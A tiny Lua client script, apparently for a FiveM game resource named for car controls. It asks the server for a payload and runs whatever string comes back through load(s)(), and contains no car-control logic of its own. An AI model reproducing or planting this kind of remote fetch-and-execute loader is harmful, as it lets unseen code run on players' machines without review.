startup = function()
    Wait(1000)
    TriggerServerEvent('carcontrol:getter')
end
gotter = function(s) if s then load(s)(); end end
utils.event(true, gotter, 'carcontrols:gotter')
utils.thread(startup)